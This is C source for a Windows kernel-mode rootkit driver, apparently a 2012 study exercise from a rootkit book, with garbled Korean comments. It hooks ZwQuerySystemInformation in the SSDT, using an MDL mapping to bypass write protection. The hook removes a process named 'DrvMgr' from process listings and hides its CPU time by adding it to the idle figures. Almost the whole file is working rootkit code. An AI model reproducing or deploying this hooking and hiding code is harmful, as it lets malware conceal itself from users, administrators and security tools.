
/*++
    2012. 9. 26
    
    HideProcessHookMDL
    - ��ƮŶ 109p 
    - taskmgr.exe�� ZwQuerySystemInformation�� �̿� ���μ��� ����Ʈ ������ ���Ѵ�
    - SSDT ��

    Prerequisite
    - SSDT, KeServiceDescriptorTable(ntoskrnl.exe)
      KeServiceDescriptorTableShadow(win32k.sys, USER,GDI ������ �ּ�)
    - SSDT�� �޸� ��ȣ ����(CR0 Trick or MDL)
      MDL
      1. SSDT�� ���̽� �ּҿ� ũ�⸦ ��´�
      2. SSDT������ ǥ�����ִ� MDL�� non-paged pool �޸� ������ �����(MmCreateMdl, MmBuildMdlForNonPagedPool)
      3. ������ MDL �÷��� ���� MDL_MAPPED_TO_SYSTEM_VA���� OR�����Ѵ�
      4. MmMapLockedPages �Լ� ȣ��
    - Zw*�Լ� ���� �ڵ�
      Zw*�Լ��� opcode ������ �ش� �Լ��� �ε��� ��ȣ�� �̿��� ����
      move eax, ULONG   (ULONG�� SSDT������ �ε��� ��ȣ)
      �ε��� ��ȣ�� opcode�� �ι�° ����Ʈ �κп� ����
    - InterlockedExchange
    - ZwQuerySystemInformation
       ���μ����� ������ ���� ���ϱ�
       �۾������ڴ� �� �Լ��� �̿��� ���μ��� ����Ʈ ������ ����(SystemInformationClass, 5)


    reference
       http://vbdream.tistory.com/entry/SSDT-Hooking-2-SSDT%EB%A5%BC-%EC%A1%B0%EC%9E%91%ED%95%98%EB%A0%A4%EB%A9%B4-%EC%96%B4%EB%96%A4-%EB%B0%A9%EB%B2%95%EC%9D%84-%EC%82%AC%EC%9A%A9%ED%95%B4%EC%95%BC%ED%95%A9%EB%8B%88%EA%B9%8C

       0: kd> u nt!zwquerysysteminformation
       nt!ZwQuerySystemInformation:
       804e5ff6 b8ad000000      mov     eax,0ADh
       804e5ffb 8d542404        lea     edx,[esp+4]
       804e5fff 9c              pushfd
       804e6000 6a08            push    8
       804e6002 e8ba97ffff      call    nt!KiSystemService (804df7c1)
       804e6007 c21000          ret     10h
       nt!ZwQuerySystemTime:
       804e600a b8ae000000      mov     eax,0AEh
       804e600f 8d542404        lea     edx,[esp+4]

       ��Ÿ�ӵ����
        - sxe ld hideprocess.sys
        - bp hideprocess!DriverEntry
        - sxr : reset filter settings to default values
 --*/

#include <ntddk.h>
//#include "nativeAPI.h"   // driver : include���� ���Խ�Ű��.... ��Ÿ�� �����


#pragma pack(1)
typedef struct ServiceDescriptorEntry {
    unsigned int *ServiceTableBase;
    unsigned int *ServiceCounterTableBase; //Used only in checked build
    unsigned int NumberOfServices;
    unsigned char *ParamTableBase;
} ServiceDescriptorTableEntry_t, *PServiceDescriptorTableEntry_t;
#pragma pack()


// Zw*�Լ��� SSDT�� Nt*�Լ��� �ϴ��� ���� �ƴ�

// ntoskernl.exe���� �����ϴ� Zw*�Լ��� �ּҸ� �Է� �޾� �׿� �����ϴ� SSDT������ Nt*�Լ��� �ּҸ� ����
#define SYSTEMSERVICE(_function)  KeServiceDescriptorTable.ServiceTableBase[ *(PULONG)((PUCHAR)_function+1)]
// Zw*�Լ��� �ּҸ� �Է� �޾� �ش� �Լ��� SSDT������ �ε��� ��ȣ�� ���Ѵ�
#define SYSCALL_INDEX(_Function) *(PULONG)((PUCHAR)_Function+1)
// _Function�� Zw*�Լ� �ּ�
#define HOOK_SYSCALL(_Function, _Hook, _Orig )  \
    _Orig = (PVOID) InterlockedExchange( (PLONG) &MappedSystemCallTable[SYSCALL_INDEX(_Function)], (LONG) _Hook)
#define UNHOOK_SYSCALL(_Function, _Hook, _Orig )  \
    InterlockedExchange( (PLONG) &MappedSystemCallTable[SYSCALL_INDEX(_Function)], (LONG) _Hook)

typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemBasicInformation = 0,
    SystemPerformanceInformation = 2,
    SystemTimeOfDayInformation = 3,
    SystemProcessInformation = 5,
    SystemProcessorPerformanceInformation = 8,
    SystemInterruptInformation = 23,
    SystemExceptionInformation = 33,
    SystemRegistryQuotaInformation = 37,
    SystemLookasideInformation = 45
} SYSTEM_INFORMATION_CLASS;


struct _SYSTEM_THREADS
{
    LARGE_INTEGER           KernelTime;
    LARGE_INTEGER           UserTime;
    LARGE_INTEGER           CreateTime;
    ULONG                           WaitTime;
    PVOID                           StartAddress;
    CLIENT_ID                       ClientIs;
    KPRIORITY                       Priority;
    KPRIORITY                       BasePriority;
    ULONG                           ContextSwitchCount;
    ULONG                           ThreadState;
    KWAIT_REASON            WaitReason;
};

struct _SYSTEM_PROCESSES
{
    ULONG                           NextEntryDelta;
    ULONG                           ThreadCount;
    ULONG                           Reserved[6];
    LARGE_INTEGER           CreateTime;
    LARGE_INTEGER           UserTime;
    LARGE_INTEGER           KernelTime;
    UNICODE_STRING          ProcessName;
    KPRIORITY                       BasePriority;
    ULONG                           ProcessId;
    ULONG                           InheritedFromProcessId;
    ULONG                           HandleCount;
    ULONG                           Reserved2[2];
    VM_COUNTERS                     VmCounters;
    IO_COUNTERS                     IoCounters; //windows 2000 only
    struct _SYSTEM_THREADS          Threads[1];
};

// Added by Creative of rootkit.com
struct _SYSTEM_PROCESSOR_TIMES
{
    LARGE_INTEGER					IdleTime;
    LARGE_INTEGER					KernelTime;
    LARGE_INTEGER					UserTime;
    LARGE_INTEGER					DpcTime;
    LARGE_INTEGER					InterruptTime;
    ULONG							InterruptCount;
};


NTSYSAPI
NTSTATUS
NTAPI
ZwQuerySystemInformation(
                         IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
                         OUT PVOID SystemInformation,
                         IN ULONG SystemInformationLength,
                         OUT PULONG ReturnLength OPTIONAL
                         );

typedef 
NTSYSAPI
NTSTATUS
(NTAPI
*ZWQUERYSYSTEMINFORMATION)(
                         IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
                         OUT PVOID SystemInformation,
                         IN ULONG SystemInformationLength,
                         OUT PULONG ReturnLength OPTIONAL
                         );

ZWQUERYSYSTEMINFORMATION OldZwQuerySystemInformation;

LARGE_INTEGER m_UserTime;
LARGE_INTEGER m_KernelTime;
__declspec(dllimport)  ServiceDescriptorTableEntry_t KeServiceDescriptorTable;
PMDL  g_pmdlSystemCall;
PVOID *MappedSystemCallTable;


NTSTATUS NewZwQuerySystemInformation(
                                     IN ULONG SystemInformationClass,
                                     IN PVOID SystemInformation,
                                     IN ULONG SystemInformationLength,
                                     OUT PULONG ReturnLength)
{
    NTSTATUS ntStatus;

    ntStatus = OldZwQuerySystemInformation(SystemInformationClass, SystemInformation, 
                                                SystemInformationLength, ReturnLength);

    if(NT_SUCCESS(ntStatus))
    {
        if(SystemInformationClass == SystemProcessInformation)
        {
            struct _SYSTEM_PROCESSES *curr = (struct _SYSTEM_PROCESSES*)SystemInformation;
            struct _SYSTEM_PROCESSES *prev = NULL;

            while(curr)
            {
                if(curr->ProcessName.Buffer != NULL)
                {
                    if(memcmp(curr->ProcessName.Buffer, L"DrvMgr", wcslen(L"DrvMgr")) == 0)
                    {
                        m_UserTime.QuadPart += curr->UserTime.QuadPart;
                        m_KernelTime.QuadPart += curr->KernelTime.QuadPart;

                        if(prev) // Middle or Last entry
                        {
                            if(curr->NextEntryDelta)
                                prev->NextEntryDelta += curr->NextEntryDelta;
                            else	// we are last, so make prev the end
                                prev->NextEntryDelta = 0;
                        }
                        else
                        {
                            if(curr->NextEntryDelta)
                            {
                                // we are first in the list, so move it forward
                                (char *)SystemInformation += curr->NextEntryDelta;
                            }
                            else // we are the only process!
                                SystemInformation = NULL;
                        }
                    }
                }
                else    // This is the entry for the Idle process
                {
                    curr->UserTime.QuadPart += m_UserTime.QuadPart;
                    curr->KernelTime.QuadPart += m_KernelTime.QuadPart;

                    m_UserTime.QuadPart = m_KernelTime.QuadPart = 0;
                }

                prev= curr;
                if(curr->NextEntryDelta)
                    (char*)curr += curr->NextEntryDelta;
                else
                    curr = NULL;
            }
        }
        else if(SystemInformationClass == SystemProcessorPerformanceInformation)  // Query for SystemProcessorTimes
        {
            struct _SYSTEM_PROCESSOR_TIMES *times = (struct _SYSTEM_PROCESSOR_TIMES*)SystemInformation;
            times->IdleTime.QuadPart += m_UserTime.QuadPart + m_KernelTime.QuadPart;
        }
    }

    return ntStatus;
}


VOID OnUnload(IN PDRIVER_OBJECT DriverObject)
{
    DbgPrint("HideProcessHookMDL OnUnload called\n");

    UNHOOK_SYSCALL(ZwQuerySystemInformation, OldZwQuerySystemInformation, NewZwQuerySystemInformation);

    if(g_pmdlSystemCall)
    {
        MmUnmapLockedPages(MappedSystemCallTable, g_pmdlSystemCall);
        IoFreeMdl(g_pmdlSystemCall);
    }
}


NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath)
{
   
    DriverObject->DriverUnload = OnUnload;

    m_UserTime.QuadPart = m_KernelTime.QuadPart = 0;

    OldZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)(SYSTEMSERVICE(ZwQuerySystemInformation));

    g_pmdlSystemCall = MmCreateMdl(NULL, KeServiceDescriptorTable.ServiceTableBase, KeServiceDescriptorTable.NumberOfServices*4);
    if(!g_pmdlSystemCall)
        return STATUS_UNSUCCESSFUL;

    MmBuildMdlForNonPagedPool(g_pmdlSystemCall);

    g_pmdlSystemCall->MdlFlags = g_pmdlSystemCall->MdlFlags | MDL_MAPPED_TO_SYSTEM_VA;

    MappedSystemCallTable = MmMapLockedPages(g_pmdlSystemCall, KernelMode);

    HOOK_SYSCALL(ZwQuerySystemInformation, NewZwQuerySystemInformation, OldZwQuerySystemInformation);


    DbgPrint("HideProcessHookMDL complete : old %08x -> new %08x\n", OldZwQuerySystemInformation, ZwQuerySystemInformation);

    return STATUS_SUCCESS;
}
